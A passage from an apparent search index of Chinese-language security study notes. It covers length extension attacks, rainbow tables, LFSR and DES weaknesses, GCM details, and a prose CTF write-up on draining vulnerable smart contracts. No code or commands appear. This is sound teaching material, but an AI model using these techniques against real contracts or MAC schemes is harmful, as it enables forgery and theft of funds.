\u628a\u8981\u4e32\u63a5\u7684 append append \u7576\u4f5c\u65b0\u7684\u660e\u6587\u7b97\u4e0b\u53bb\u5c31\u597d \u6211\u5011\u5c31\u53ef\u4ee5\u6210\u529f\u7b97\u51fa\u65b0\u7684\u660e\u6587 message || padding || append message || padding || append \u7684\u9a57\u8b49\u78bc \u8a3b\u8a18 SHA224 \u4e0d\u6703\u53d7\u5230 LEA \u7684\u653b\u64ca\uff0c\u56e0\u70ba SHA224 \u7684\u8a08\u7b97\u6b65\u9a5f\u8ddf SHA256 \u4e00\u6a21\u4e00\u6a23\uff0c\u53ea\u5dee\u5728 SHA224 \u53ea\u53d6 H_n H_n \u7684 224 bits\uff0c\u6240\u4ee5\u6211\u5011\u7121\u6cd5\u9084\u539f SHA224 \u7684 internal state\uff0c\u7121\u6cd5\u9032\u884c LEA attack \u5de5\u5177 hashpump hash_extender","title":"Length Extension Attack"},{"location":"security/crypto/hash/length-extension-attack/#length-extension-attack-lea","text":"\u9019\u500b\u653b\u64ca\u9069\u7528\u65bc Merkle\u2013Damg\u00e5rd Construction \u985e\u578b\u7684 hash function H H \u7576 MAC \u9a57\u8b49\u6f14\u7b97\u6cd5\u662f H(salt || message) H(salt || message) ( || || \u662f\u5b57\u4e32\u4e32\u63a5 ) \u6211\u5011\u53ef\u4ee5\u7e5e\u904e MAC \u9a57\u8b49\u6a5f\u5236\u7684\u4fdd\u8b77\uff0c \u5c0d\u660e\u6587\u4e32\u63a5\u90e8\u5206\u8cc7\u6599","title":"Length Extension Attack ( LEA )"},{"location":"security/crypto/hash/length-extension-attack/#_1","text":"\u9700\u8981\u77e5\u9053 message message \u548c H(salt || message) H(salt || message) \u548c salt || message salt || message \u7684\u9577\u5ea6","title":"\u9650\u5236"},{"location":"security/crypto/hash/length-extension-attack/#_2","text":"\u6211\u5011\u8981\u7e5e\u904e MAC \u9a57\u8b49\u6a5f\u5236\uff0c\u5176\u5be6\u5c31\u662f\u5728\u6539\u52d5\u660e\u6587\u5f8c\u91cd\u65b0\u8a08\u7b97\u9a57\u8b49\u78bc \u8981\u91cd\u65b0\u8a08\u7b97\u5f88\u7c21\u55ae\uff0c\u6211\u5011\u628a H(salt || message) H(salt || message) \u7576\u4f5c\u65b0\u7684 IV' IV' \u628a\u8981\u4e32\u63a5\u7684 append append \u7576\u4f5c\u65b0\u7684\u660e\u6587\u7b97\u4e0b\u53bb\u5c31\u597d \u6211\u5011\u5c31\u53ef\u4ee5\u6210\u529f\u7b97\u51fa\u65b0\u7684\u660e\u6587 message || padding || append message || padding || append \u7684\u9a57\u8b49\u78bc","title":"\u539f\u7406"},{"location":"security/crypto/hash/length-extension-attack/#_3","text":"SHA224 \u4e0d\u6703\u53d7\u5230 LEA \u7684\u653b\u64ca\uff0c\u56e0\u70ba SHA224 \u7684\u8a08\u7b97\u6b65\u9a5f\u8ddf SHA256 \u4e00\u6a21\u4e00\u6a23\uff0c\u53ea\u5dee\u5728 SHA224 \u53ea\u53d6 H_n H_n \u7684 224 bits\uff0c\u6240\u4ee5\u6211\u5011\u7121\u6cd5\u9084\u539f SHA224 \u7684 internal state\uff0c\u7121\u6cd5\u9032\u884c LEA attack","title":"\u8a3b\u8a18"},{"location":"security/crypto/hash/length-extension-attack/#_4","text":"hashpump hash_extender","title":"\u5de5\u5177"},{"location":"security/crypto/hash/merkle-damgard/","text":"Merkle\u2013Damg\u00e5rd Construction \u6211\u5011\u6709 function h h \uff0c\u548c hash function H H H_0 = IV H_0 = IV \\forall 1 \\leq i \\leq n : H_i = h(H_{i-1}, m_{i-1}) \\forall 1 \\leq i \\leq n : H_i = h(H_{i-1}, m_{i-1}) H(m) = H_n H(m) = H_n \u61c9\u7528 \u8a31\u591a hash function \u90fd\u662f Merkle\u2013Damg\u00e5rd Construction\uff0c\u5dee\u5225\u5728\u65bc\u4ed6\u5011\u5be6\u4f5c\u4e0d\u540c\u7684 function h h \u4e0b\u9762\u5217\u51fa\u5c6c\u65bc Merkle\u2013Damg\u00e5rd Construction \u7684 hash function \u540d\u7a31 \u8f38\u51fa\u9577\u5ea6 \u5340\u584a\u9577\u5ea6 MD4 128 bits ( 16 bytes ) 512 bits ( 64 bytes ) MD5 128 bits ( 16 bytes ) 512 bits ( 64 bytes ) RIPEMD-160 160 bits ( 20 bytes ) 512 bits ( 64 bytes ) SHA0 160 bits ( 20 bytes ) 512 bits ( 64 bytes ) SHA1 160 bits ( 20 bytes ) 512 bits ( 64 bytes ) SHA256 256 bits ( 32 bytes ) 1088 bits ( 136 bytes ) SHA512 512 bits ( 64 bytes ) 576 bits ( 72 bytes ) WHIRLPOOL 512 bits ( 64 bytes ) 512 bits ( 64 bytes )","title":"Merkle\u2013Damg\u00e5rd Construction"},{"location":"security/crypto/hash/merkle-damgard/#merkledamgard-construction","text":"\u6211\u5011\u6709 function h h \uff0c\u548c hash function H H H_0 = IV H_0 = IV \\forall 1 \\leq i \\leq n : H_i = h(H_{i-1}, m_{i-1}) \\forall 1 \\leq i \\leq n : H_i = h(H_{i-1}, m_{i-1}) H(m) = H_n H(m) = H_n","title":"Merkle\u2013Damg\u00e5rd Construction"},{"location":"security/crypto/hash/merkle-damgard/#_1","text":"\u8a31\u591a hash function \u90fd\u662f Merkle\u2013Damg\u00e5rd Construction\uff0c\u5dee\u5225\u5728\u65bc\u4ed6\u5011\u5be6\u4f5c\u4e0d\u540c\u7684 function h h \u4e0b\u9762\u5217\u51fa\u5c6c\u65bc Merkle\u2013Damg\u00e5rd Construction \u7684 hash function \u540d\u7a31 \u8f38\u51fa\u9577\u5ea6 \u5340\u584a\u9577\u5ea6 MD4 128 bits ( 16 bytes ) 512 bits ( 64 bytes ) MD5 128 bits ( 16 bytes ) 512 bits ( 64 bytes ) RIPEMD-160 160 bits ( 20 bytes ) 512 bits ( 64 bytes ) SHA0 160 bits ( 20 bytes ) 512 bits ( 64 bytes ) SHA1 160 bits ( 20 bytes ) 512 bits ( 64 bytes ) SHA256 256 bits ( 32 bytes ) 1088 bits ( 136 bytes ) SHA512 512 bits ( 64 bytes ) 576 bits ( 72 bytes ) WHIRLPOOL 512 bits ( 64 bytes ) 512 bits ( 64 bytes )","title":"\u61c9\u7528"},{"location":"security/crypto/hash/rainbow-table/","text":"\u5f69\u8679\u8868 ( Rainbow Table ) \u5b57\u5178\u653b\u64ca\u662f\u9810\u5148\u5132\u5b58\u4e00\u500b\u5f88\u5927\u7684\u8cc7\u6599\u5eab\uff0c\u88e1\u9762\u5305\u542b\u8a31\u591a\u5e38\u898b\u5b57\u4e32\u7684 hash value\uff0c\u900f\u904e\u67e5\u8868\u7684\u65b9\u5f0f\u627e\u56de hash key \u5f69\u8679\u8868\u548c\u5b57\u5178\u653b\u64ca\u4e00\u6a23\u662f\u7528\u7a7a\u9593\u63db\u53d6\u6642\u9593\uff0c\u4f46\u5f69\u8679\u8868\u591a\u72a7\u7272\u4e86\u4e00\u9ede\u6642\u9593\u4f86\u63db\u53bb\u66f4\u5c0f\u7684\u7a7a\u9593 \u539f\u7406 \u6211\u5011\u6709\u4e00\u500b hash function H H \uff0c\u8f38\u5165\u4efb\u610f\u9577\u5ea6\u7684\u8cc7\u6599\uff0c\u8f38\u51fa n n bits \u7684\u8cc7\u6599 \u5b9a\u7fa9\u53e6\u4e00\u500b function R R \uff0c\u8f38\u5165 n n bits \u7684\u8cc7\u6599\uff0c\u8f38\u51fa m m bits \u7684\u8cc7\u6599 \u6311\u9078\u8a31\u591a\u521d\u59cb\u503c p_0 p_0 \u8a08\u7b97 \\forall 1 \\leq i \\leq n : q_{i-1} = H(p_{i-1}), p_i = R(q_{i-1}) \\forall 1 \\leq i \\leq n : q_{i-1} = H(p_{i-1}), p_i = R(q_{i-1}) \u5f8c\u5c07 (p_0, p_n) (p_0, p_n) \u5b58\u5165\u8cc7\u6599\u5eab \u6211\u5011\u7a31 p_0, q_0, p_1, \\cdots, p_n p_0, q_0, p_1, \\cdots, p_n \u70ba hash chain \u7d66 Q Q \u6211\u5011\u8981\u627e P P \u4f7f\u5f97 H(P) = Q H(P) = Q \u90a3\u6211\u5011\u5c31\u627e\u8cc7\u6599\u5eab\u88e1\u9762\u6709\u6c92\u6709 p_n = R(Q) p_n = R(Q) \uff0c\u6709\u7684\u8a71 P = p_{n-1} P = p_{n-1} \uff0c\u56e0\u70ba H(p_{n-1}) = Q H(p_{n-1}) = Q \u6c92\u6709\u7684\u8a71\u5c31\u7e7c\u7e8c\u627e\u8cc7\u6599\u5eab\u88e1\u9762\u6709\u6c92\u6709 p_n = R(H(R(Q))) p_n = R(H(R(Q))) \uff0c\u6709\u7684\u8a71 P = p_{n-2} P = p_{n-2} \uff0c\u56e0\u70ba H(p_{n-2}) = Q H(p_{n-2}) = Q \u7136\u5f8c\u5c31\u9019\u6a23\u6383\u904e hash chain \u5de5\u5177 ophcrack rainbowcrack rtgen","title":"Rainbow Table"},{"location":"security/crypto/hash/rainbow-table/#rainbow-table","text":"\u5b57\u5178\u653b\u64ca\u662f\u9810\u5148\u5132\u5b58\u4e00\u500b\u5f88\u5927\u7684\u8cc7\u6599\u5eab\uff0c\u88e1\u9762\u5305\u542b\u8a31\u591a\u5e38\u898b\u5b57\u4e32\u7684 hash value\uff0c\u900f\u904e\u67e5\u8868\u7684\u65b9\u5f0f\u627e\u56de hash key \u5f69\u8679\u8868\u548c\u5b57\u5178\u653b\u64ca\u4e00\u6a23\u662f\u7528\u7a7a\u9593\u63db\u53d6\u6642\u9593\uff0c\u4f46\u5f69\u8679\u8868\u591a\u72a7\u7272\u4e86\u4e00\u9ede\u6642\u9593\u4f86\u63db\u53bb\u66f4\u5c0f\u7684\u7a7a\u9593","title":"\u5f69\u8679\u8868 ( Rainbow Table )"},{"location":"security/crypto/hash/rainbow-table/#_1","text":"\u6211\u5011\u6709\u4e00\u500b hash function H H \uff0c\u8f38\u5165\u4efb\u610f\u9577\u5ea6\u7684\u8cc7\u6599\uff0c\u8f38\u51fa n n bits \u7684\u8cc7\u6599 \u5b9a\u7fa9\u53e6\u4e00\u500b function R R \uff0c\u8f38\u5165 n n bits \u7684\u8cc7\u6599\uff0c\u8f38\u51fa m m bits \u7684\u8cc7\u6599 \u6311\u9078\u8a31\u591a\u521d\u59cb\u503c p_0 p_0 \u8a08\u7b97 \\forall 1 \\leq i \\leq n : q_{i-1} = H(p_{i-1}), p_i = R(q_{i-1}) \\forall 1 \\leq i \\leq n : q_{i-1} = H(p_{i-1}), p_i = R(q_{i-1}) \u5f8c\u5c07 (p_0, p_n) (p_0, p_n) \u5b58\u5165\u8cc7\u6599\u5eab \u6211\u5011\u7a31 p_0, q_0, p_1, \\cdots, p_n p_0, q_0, p_1, \\cdots, p_n \u70ba hash chain \u7d66 Q Q \u6211\u5011\u8981\u627e P P \u4f7f\u5f97 H(P) = Q H(P) = Q \u90a3\u6211\u5011\u5c31\u627e\u8cc7\u6599\u5eab\u88e1\u9762\u6709\u6c92\u6709 p_n = R(Q) p_n = R(Q) \uff0c\u6709\u7684\u8a71 P = p_{n-1} P = p_{n-1} \uff0c\u56e0\u70ba H(p_{n-1}) = Q H(p_{n-1}) = Q \u6c92\u6709\u7684\u8a71\u5c31\u7e7c\u7e8c\u627e\u8cc7\u6599\u5eab\u88e1\u9762\u6709\u6c92\u6709 p_n = R(H(R(Q))) p_n = R(H(R(Q))) \uff0c\u6709\u7684\u8a71 P = p_{n-2} P = p_{n-2} \uff0c\u56e0\u70ba H(p_{n-2}) = Q H(p_{n-2}) = Q \u7136\u5f8c\u5c31\u9019\u6a23\u6383\u904e hash chain","title":"\u539f\u7406"},{"location":"security/crypto/hash/rainbow-table/#_2","text":"ophcrack rainbowcrack rtgen","title":"\u5de5\u5177"},{"location":"security/crypto/stream/lfsr/","text":"LFSR of degree m m \u7684\u521d\u59cb\u72c0\u614b\u70ba s_0, s_1, \\cdots, s_{m-1} s_0, s_1, \\cdots, s_{m-1} s_n = s_{n-1}p_{m-1} + \\cdots + s_{n-m+2}p_1 + s_{n-m+1}p_0 s_n = s_{n-1}p_{m-1} + \\cdots + s_{n-m+2}p_1 + s_{n-m+1}p_0 \u53ef\u4ee5\u7528\u4e00\u500b polynomial \u4f86\u8868\u793a LFSR P(x) = x_m + p_{m\u22121} x_{m\u22121} + \\cdots + p_1 x + p_0 P(x) = x_m + p_{m\u22121} x_{m\u22121} + \\cdots + p_1 x + p_0 Theorem 1 LFSR \u80fd\u7522\u751f\u4e0d\u91cd\u8907\u7684\u6700\u9577\u9577\u5ea6\u662f 2^m - 1 2^m - 1 ( \u9664\u4e86\u5168\u90e8\u90fd\u96f6\u7684\u5176\u4ed6\u6240\u6709\u72c0\u614b ) \u9577\u5ea6\u70ba 2^m - 1 2^m - 1 \u7684 LSFR \u662f\u4e00\u500b primitive polynomials Known Plaintext Attack \u53ea\u8981\u77e5\u9053 2m \u500b state \u5c31\u53ef\u4ee5\u89e3 LFSR \u89e3\u65b9\u7a0b\u7d44 \\begin{aligned} &s_m = p_{m\u22121}s_{m\u22121} +...+ p_1s_1 + p_0s_0 \\\\ &s_{m+1} = p_{m\u22121}s_m +...+ p_1s_2 + p_0s_1 \\\\ &\\cdots \\\\ &s_{2m-1} = p_{m\u22121}s_{2m\u22122} +...+ p_1s_m + p_0s_{m-1} \\end{aligned} \\begin{aligned} &s_m = p_{m\u22121}s_{m\u22121} +...+ p_1s_1 + p_0s_0 \\\\ &s_{m+1} = p_{m\u22121}s_m +...+ p_1s_2 + p_0s_1 \\\\ &\\cdots \\\\ &s_{2m-1} = p_{m\u22121}s_{2m\u22122} +...+ p_1s_m + p_0s_{m-1} \\end{aligned} \u5df2\u77e5 s_0, s_1, \\cdots, s_{2m-1} s_0, s_1, \\cdots, s_{2m-1} \u672a\u77e5 p_0, p_1, \\cdots, p_{m-1} p_0, p_1, \\cdots, p_{m-1} m m \u500b\u672a\u77e5\u6578 m m \u500b\u65b9\u7a0b\u5f0f\uff0c\u4f7f\u7528\u9ad8\u65af\u6d88\u53bb\u6cd5\u89e3\u51fa p_0, p_1, \\cdots, p_{m-1} p_0, p_1, \\cdots, p_{m-1}","title":"Linear Feedback Shift Register"},{"location":"security/crypto/stream/lfsr/#theorem-1","text":"LFSR \u80fd\u7522\u751f\u4e0d\u91cd\u8907\u7684\u6700\u9577\u9577\u5ea6\u662f 2^m - 1 2^m - 1 ( \u9664\u4e86\u5168\u90e8\u90fd\u96f6\u7684\u5176\u4ed6\u6240\u6709\u72c0\u614b ) \u9577\u5ea6\u70ba 2^m - 1 2^m - 1 \u7684 LSFR \u662f\u4e00\u500b primitive polynomials","title":"Theorem 1"},{"location":"security/crypto/stream/lfsr/#known-plaintext-attack","text":"\u53ea\u8981\u77e5\u9053 2m \u500b state \u5c31\u53ef\u4ee5\u89e3 LFSR","title":"Known Plaintext Attack"},{"location":"security/crypto/stream/lfsr/#_1","text":"\\begin{aligned} &s_m = p_{m\u22121}s_{m\u22121} +...+ p_1s_1 + p_0s_0 \\\\ &s_{m+1} = p_{m\u22121}s_m +...+ p_1s_2 + p_0s_1 \\\\ &\\cdots \\\\ &s_{2m-1} = p_{m\u22121}s_{2m\u22122} +...+ p_1s_m + p_0s_{m-1} \\end{aligned} \\begin{aligned} &s_m = p_{m\u22121}s_{m\u22121} +...+ p_1s_1 + p_0s_0 \\\\ &s_{m+1} = p_{m\u22121}s_m +...+ p_1s_2 + p_0s_1 \\\\ &\\cdots \\\\ &s_{2m-1} = p_{m\u22121}s_{2m\u22122} +...+ p_1s_m + p_0s_{m-1} \\end{aligned} \u5df2\u77e5 s_0, s_1, \\cdots, s_{2m-1} s_0, s_1, \\cdots, s_{2m-1} \u672a\u77e5 p_0, p_1, \\cdots, p_{m-1} p_0, p_1, \\cdots, p_{m-1} m m \u500b\u672a\u77e5\u6578 m m \u500b\u65b9\u7a0b\u5f0f\uff0c\u4f7f\u7528\u9ad8\u65af\u6d88\u53bb\u6cd5\u89e3\u51fa p_0, p_1, \\cdots, p_{m-1} p_0, p_1, \\cdots, p_{m-1}","title":"\u89e3\u65b9\u7a0b\u7d44"},{"location":"security/crypto/symmetric/aes/","text":"","title":"AES"},{"location":"security/crypto/symmetric/des/","text":"DES ( Data Encryption Standard ) \u9019\u908a\u4e0d\u8a0e\u8ad6 DES \u7684\u7d30\u7bc0\u6b65\u9a5f\uff0c\u9084\u4e0d\u6e05\u695a\u7684\u53ef\u4ee5\u770b\u76f8\u95dc\u8cc7\u6599\u4e2d\u9023\u7d50\u88e1\u7684\u6559\u5b78 DES \u53ef\u4ee5\u770b\u4f5c\u662f\u9019\u4e9b state \u7684\u6f14\u7b97 M_0, M_1, \\cdots, M_{17} M_0, M_1, \\cdots, M_{17} M_{i + 1} = M_{i - 1} + f(k_i, M_i) M_{i + 1} = M_{i - 1} + f(k_i, M_i) \u8f38\u5165\u662f M_0, M_1 M_0, M_1 \u8f38\u51fa\u662f M_{17}, M_{16} M_{17}, M_{16} k_i k_i \u662f\u5f9e\u91d1\u9470\u7522\u751f\u51fa\u4f86\u7684 subkey Parity Check DES \u7684\u91d1\u9470\u53ea\u7528\u4e86 56 bits \u6bcf\u500b byte \u7684\u6700\u5f8c\u4e00\u500b bit \u662f\u62ff\u4f86\u505a Parity Check Weak Keys weak key \u662f\u6307\u6703\u8b93\u52a0\u5bc6\u548c\u89e3\u5bc6\u4e00\u6a23\u7684 key \u9019\u56db\u500b weak key \u6703\u7522\u751f 16 \u500b\u76f8\u540c\u7684 subkeys 0x0101010101010101 0xFEFEFEFEFEFEFEFE 0xE0E0E0E0F1F1F1F1 0x1F1F1F1F0E0E0E0E \u56e0\u70ba DES \u7684\u52a0\u5bc6\u548c\u89e3\u5bc6\u53ea\u5dee\u5728 subkeys \u7684\u9806\u5e8f\uff0c\u65e2\u7136 subkeys \u90fd\u4e00\u6a23\u90a3\u52a0\u5bc6\u8ddf\u89e3\u5bc6\u4e5f\u662f\u4e00\u6a23\u7684 \u9664\u4e86 weak key \u9084\u6709 semi weak key \u53ea\u7522\u751f\u5169\u7a2e subkeys \u5404 8 \u500b Fixed Point in Weak Keys Fixed Point \u662f\u6307 E(m) = m E(m) = m \uff0c\u4e5f\u5c31\u662f\u81ea\u5df1\u52a0\u5bc6\u5b8c\u9084\u662f\u81ea\u5df1 \u7576\u6211\u5011\u7684 subkeys \u5168\u90e8\u90fd\u4e00\u6a23\u6642 \u53ef\u4ee5\u8b49\u660e\u53ea\u6709\u7576 M_8 = M_9 M_8 = M_9 \u6642\u624d\u6703\u6709 Fixed Point \u90a3\u9ebc\u6211\u5011\u53ef\u4ee5\u96a8\u4fbf\u9078\u4e00\u500b\u503c\u4f86\u7576\u4f5c M_8 = M_9 M_8 = M_9 \u7136\u5f8c\u5f80\u4e0b\u7b97 M_{10}, \\cdots, M_{17} M_{10}, \\cdots, M_{17} \uff0c\u7b97\u51fa\u4f86\u7684\u5c31\u662f Fixed Point \u6240\u4ee5 key \u662f weak key \u7684\u8a71\uff0c\u6703\u6709\u4e00\u534a\u7684\u6a5f\u6703\uff0c\u4e5f\u5c31\u662f 2^{32} 2^{32} \u500b\u662f Fixed Point \u76f8\u95dc\u8cc7\u6599 https://www.tutorialspoint.com/cryptography/data_encryption_standard.htm https://en.wikipedia.org/wiki/Weak_key#Weak_keys_in_DES https://universalflowuniversity.com/Books/Computer%20Programming/Malware%20and%20Cryptography/Introduction%20to%20Modern%20Cryptography%202nd%20Edition.pdf https://csrc.nist.gov/csrc/media/publications/fips/46/3/archive/1999-10-25/documents/fips46-3.pdf https://crypto.stackexchange.com/questions/20896/what-is-the-fixed-point-attribute-of-des-when-used-with-weak-keys","title":"DES"},{"location":"security/crypto/symmetric/des/#des-data-encryption-standard","text":"\u9019\u908a\u4e0d\u8a0e\u8ad6 DES \u7684\u7d30\u7bc0\u6b65\u9a5f\uff0c\u9084\u4e0d\u6e05\u695a\u7684\u53ef\u4ee5\u770b\u76f8\u95dc\u8cc7\u6599\u4e2d\u9023\u7d50\u88e1\u7684\u6559\u5b78 DES \u53ef\u4ee5\u770b\u4f5c\u662f\u9019\u4e9b state \u7684\u6f14\u7b97 M_0, M_1, \\cdots, M_{17} M_0, M_1, \\cdots, M_{17} M_{i + 1} = M_{i - 1} + f(k_i, M_i) M_{i + 1} = M_{i - 1} + f(k_i, M_i) \u8f38\u5165\u662f M_0, M_1 M_0, M_1 \u8f38\u51fa\u662f M_{17}, M_{16} M_{17}, M_{16} k_i k_i \u662f\u5f9e\u91d1\u9470\u7522\u751f\u51fa\u4f86\u7684 subkey","title":"DES ( Data Encryption Standard )"},{"location":"security/crypto/symmetric/des/#parity-check","text":"DES \u7684\u91d1\u9470\u53ea\u7528\u4e86 56 bits \u6bcf\u500b byte \u7684\u6700\u5f8c\u4e00\u500b bit \u662f\u62ff\u4f86\u505a Parity Check","title":"Parity Check"},{"location":"security/crypto/symmetric/des/#weak-keys","text":"weak key \u662f\u6307\u6703\u8b93\u52a0\u5bc6\u548c\u89e3\u5bc6\u4e00\u6a23\u7684 key \u9019\u56db\u500b weak key \u6703\u7522\u751f 16 \u500b\u76f8\u540c\u7684 subkeys 0x0101010101010101 0xFEFEFEFEFEFEFEFE 0xE0E0E0E0F1F1F1F1 0x1F1F1F1F0E0E0E0E \u56e0\u70ba DES \u7684\u52a0\u5bc6\u548c\u89e3\u5bc6\u53ea\u5dee\u5728 subkeys \u7684\u9806\u5e8f\uff0c\u65e2\u7136 subkeys \u90fd\u4e00\u6a23\u90a3\u52a0\u5bc6\u8ddf\u89e3\u5bc6\u4e5f\u662f\u4e00\u6a23\u7684 \u9664\u4e86 weak key \u9084\u6709 semi weak key \u53ea\u7522\u751f\u5169\u7a2e subkeys \u5404 8 \u500b","title":"Weak Keys"},{"location":"security/crypto/symmetric/des/#fixed-point-in-weak-keys","text":"Fixed Point \u662f\u6307 E(m) = m E(m) = m \uff0c\u4e5f\u5c31\u662f\u81ea\u5df1\u52a0\u5bc6\u5b8c\u9084\u662f\u81ea\u5df1 \u7576\u6211\u5011\u7684 subkeys \u5168\u90e8\u90fd\u4e00\u6a23\u6642 \u53ef\u4ee5\u8b49\u660e\u53ea\u6709\u7576 M_8 = M_9 M_8 = M_9 \u6642\u624d\u6703\u6709 Fixed Point \u90a3\u9ebc\u6211\u5011\u53ef\u4ee5\u96a8\u4fbf\u9078\u4e00\u500b\u503c\u4f86\u7576\u4f5c M_8 = M_9 M_8 = M_9 \u7136\u5f8c\u5f80\u4e0b\u7b97 M_{10}, \\cdots, M_{17} M_{10}, \\cdots, M_{17} \uff0c\u7b97\u51fa\u4f86\u7684\u5c31\u662f Fixed Point \u6240\u4ee5 key \u662f weak key \u7684\u8a71\uff0c\u6703\u6709\u4e00\u534a\u7684\u6a5f\u6703\uff0c\u4e5f\u5c31\u662f 2^{32} 2^{32} \u500b\u662f Fixed Point","title":"Fixed Point in Weak Keys"},{"location":"security/crypto/symmetric/des/#_1","text":"https://www.tutorialspoint.com/cryptography/data_encryption_standard.htm https://en.wikipedia.org/wiki/Weak_key#Weak_keys_in_DES https://universalflowuniversity.com/Books/Computer%20Programming/Malware%20and%20Cryptography/Introduction%20to%20Modern%20Cryptography%202nd%20Edition.pdf https://csrc.nist.gov/csrc/media/publications/fips/46/3/archive/1999-10-25/documents/fips46-3.pdf https://crypto.stackexchange.com/questions/20896/what-is-the-fixed-point-attribute-of-des-when-used-with-weak-keys","title":"\u76f8\u95dc\u8cc7\u6599"},{"location":"security/crypto/symmetric/ldc/","text":"Linear Cryptanalysis http://www.engr.mun.ca/~howard/PAPERS/ldc_tutorial.pdf \u21a9","title":"Linear and Differential Cryptanalysis"},{"location":"security/crypto/symmetric/ldc/#linear-cryptanalysis","text":"http://www.engr.mun.ca/~howard/PAPERS/ldc_tutorial.pdf \u21a9","title":"Linear Cryptanalysis"},{"location":"security/crypto/symmetric/mode/","text":"Block Cipher Modes GCM \u8981\u6ce8\u610f\u7684\u5c0f\u5730\u65b9 NIST manual \u662f little endian The convention for interpreting strings as polynomials is \"little endian\": i.e., if u is the variable of the polynomial, then the block x_0x_1 \\cdots x_{127} x_0x_1 \\cdots x_{127} corresponds to the polynomial x_0 + x_1 u + x_2 u^2 + \\cdots + x_{127} u^{127} x_0 + x_1 u + x_2 u^2 + \\cdots + x_{127} u^{127} NIST manual page 12 len(A) || len(C) \u662f\u4ec0\u9ebc \u5047\u8a2d len(A) \u662f 19 \u4e14 len(C) \u662f 148 \u90a3\u9ebc len(A) || len(C) \u9019\u500b block \u662f 00000000000000130000000000000094 H \u5f9e\u54ea\u4f86 The hash subkey, denoted H, is generated by applying the block cipher to the \"zero\" block NIST manual page 10 H = e_k(0) H = e_k(0) Galois Field \u7528\u5230\u7684 reduction modulus Let R be the bit string 11100001 \\ || \\ 0^{120} 11100001 \\ || \\ 0^{120} NIST manual page 11 The reduction modulus is the polynomial of degree 128 that corresponds to R \\ || \\ 1 R \\ || \\ 1 NIST manual page 12 \u4e5f\u5c31\u662f x^{128} + x^7 + x^2 + x + 1 x^{128} + x^7 + x^2 + x + 1","title":"Block Cipher Modes"},{"location":"security/crypto/symmetric/mode/#block-cipher-modes","text":"","title":"Block Cipher Modes"},{"location":"security/crypto/symmetric/mode/#gcm","text":"NIST manual","title":"GCM \u8981\u6ce8\u610f\u7684\u5c0f\u5730\u65b9"},{"location":"security/crypto/symmetric/mode/#little-endian","text":"The convention for interpreting strings as polynomials is \"little endian\": i.e., if u is the variable of the polynomial, then the block x_0x_1 \\cdots x_{127} x_0x_1 \\cdots x_{127} corresponds to the polynomial x_0 + x_1 u + x_2 u^2 + \\cdots + x_{127} u^{127} x_0 + x_1 u + x_2 u^2 + \\cdots + x_{127} u^{127} NIST manual page 12","title":"\u662f little endian"},{"location":"security/crypto/symmetric/mode/#lena-lenc","text":"\u5047\u8a2d len(A) \u662f 19 \u4e14 len(C) \u662f 148 \u90a3\u9ebc len(A) || len(C) \u9019\u500b block \u662f 00000000000000130000000000000094","title":"len(A) || len(C) \u662f\u4ec0\u9ebc"},{"location":"security/crypto/symmetric/mode/#h","text":"The hash subkey, denoted H, is generated by applying the block cipher to the \"zero\" block NIST manual page 10 H = e_k(0) H = e_k(0)","title":"H \u5f9e\u54ea\u4f86"},{"location":"security/crypto/symmetric/mode/#galois-field-reduction-modulus","text":"Let R be the bit string 11100001 \\ || \\ 0^{120} 11100001 \\ || \\ 0^{120} NIST manual page 11 The reduction modulus is the polynomial of degree 128 that corresponds to R \\ || \\ 1 R \\ || \\ 1 NIST manual page 12 \u4e5f\u5c31\u662f x^{128} + x^7 + x^2 + x + 1 x^{128} + x^7 + x^2 + x + 1","title":"Galois Field \u7528\u5230\u7684 reduction modulus"},{"location":"security/crypto/symmetric/padding-oracle/","text":"Padding Oracle Attack","title":"Padding Oracle Attack"},{"location":"security/crypto/symmetric/padding-oracle/#padding-oracle-attack","text":"","title":"Padding Oracle Attack"},{"location":"security/crypto/writeups/blockchain-ctf/","text":"Donation \u9019\u984c\u662f\u7c3d\u5230\u984c \u5c31\u53ea\u662f\u8b93\u6211\u5011\u547c\u53eb\u5408\u7d04\u88e1\u9762\u7684\u9019\u500b\u51fd\u5f0f withdrawDonationsFromTheSuckersWhoFellForIt Lock Box \u9019\u984c\u6709\u500b private \u7684 pin \u8b8a\u6578\uff0c\u4f46\u662f private \u53ea\u662f\u4ee3\u8868\u90a3\u500b\u8b8a\u6578\u6c92\u6709 getter \u51fd\u5f0f\uff0c\u628a\u5408\u7d04\u7684\u72c0\u614b\u6293\u4e0b\u4f86\u5c31\u770b\u5149\u5149\u5566 \u4f7f\u7528 web3.eth.getStorageAt \u9019\u500b\u51fd\u5f0f \u7236\u5408\u7d04\u7684\u8b8a\u6578\u6703\u5728\u5b50\u5408\u7d04\u7684\u8b8a\u6578\u7684\u524d\u9762 \u6240\u4ee5 position 0 \u7684\u4f4d\u5740\u662f authorizedToPlay \uff0c\u800c position 1 \u7684\u4f4d\u5740\u5c31\u662f pin \u8b8a\u6578\u5728 storage \u88e1\u9762\u600e\u9ebc\u64fa\u7684\u53ef\u4ee5\u53c3\u8003\u9019\u7bc7 Understanding Ethereum Smart Contract Storage Piggy Bank \u9019\u984c\u76f4\u63a5\u547c\u53eb collectFunds \u5c31\u597d\u4e86 \u53ea\u6709 PiggyBank \u7684 collectFunds \u6709 onlyOwner \uff0c CharliesPiggyBank \u7684 collectFunds \u6c92\u6709 onlyOwner SI Token Sale \u9019\u984c\u7684 purchaseTokens \u6c92\u6709\u7528 SafeMath\uff0c\u4e5f\u6c92\u6709\u6aa2\u67e5 _value \u8981\u5927\u65bc feeAmount \u5148\u8f49\u500b 0.000001 \u7d66\u5408\u7d04\uff0c\u9019\u6a23 0.000001 - 0.00001 \u5c31\u6703 underflow \u8b8a\u6210\u5f88\u5927\u7684\u6578\u5b57\uff0c\u5c31\u5f97\u5230\u4e86\u8d85\u591a\u7684 token \u7136\u5f8c\u518d\u7528 refundTokens \u5c31\u53ef\u4ee5\u534a\u50f9\u628a token \u63db\u6210 ether \u9322\u9322\u4e86 Secure Bank SecureBank \u7684 withdraw \u548c MembersBank \u7684 withdraw \u5176\u4e2d\u7684 _value \u53c3\u6578\u5f62\u614b\u4e0d\u4e00\u6a23 \u4ed6\u5011\u6703\u88ab\u770b\u6210\u662f\u4e0d\u4e00\u6a23\u7684\u51fd\u5f0f\uff0c\u6240\u4ee5\u6703\u6709\u5169\u500b\u4e0d\u4e00\u6a23\u7684\u578b\u614b withdraw \u53ef\u4ee5\u547c\u53eb \u800c MembersBank \u7684 withdraw \u6c92\u6709\u6aa2\u67e5\u662f\u4e0d\u662f\u672c\u4eba\uff0c\u6240\u4ee5\u5c31\u76f4\u63a5\u628a contract creator \u7684\u9322\u9818\u8d70 